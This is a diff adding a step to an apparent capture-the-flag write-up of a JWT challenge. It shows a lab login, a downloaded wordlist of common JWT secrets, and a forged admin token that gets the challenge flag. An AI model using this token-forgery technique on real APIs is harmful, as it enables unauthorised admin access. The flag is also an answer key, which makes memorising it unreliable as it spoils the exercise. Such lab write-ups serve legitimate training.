@@ -56,3 +56,38 @@ flag of example 3
 }
 ```
 
+flag of example 4
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password4" }' http://10.114.166.18/api/v1.0/example4
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY"
+}
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
+--2026-08-07 23:43:04--  https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1231757 (1.2M) [text/plain]
+Saving to: ‘jwt.secrets.list’
+
+jwt.secrets.list             100%[==============================================>]   1.17M  1.24MB/s    in 0.9s    
+
+2026-08-07 23:43:05 (1.24 MB/s) - ‘jwt.secrets.list’ saved [1231757/1231757]
+```
+
+<img width="893" height="585" alt="image" src="https://github.com/user-attachments/assets/75254319-6cea-4bc3-bd2b-12f82a7c0828" />
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc' http://10.114.166.18/api/v1.0/example4?username=admin
+
+{
+  "message": "Welcome admin, you are an admin, here is your flag: THM{e1679fef-df56-41cc-85e9-af1e0e12981b}"
+}
+```
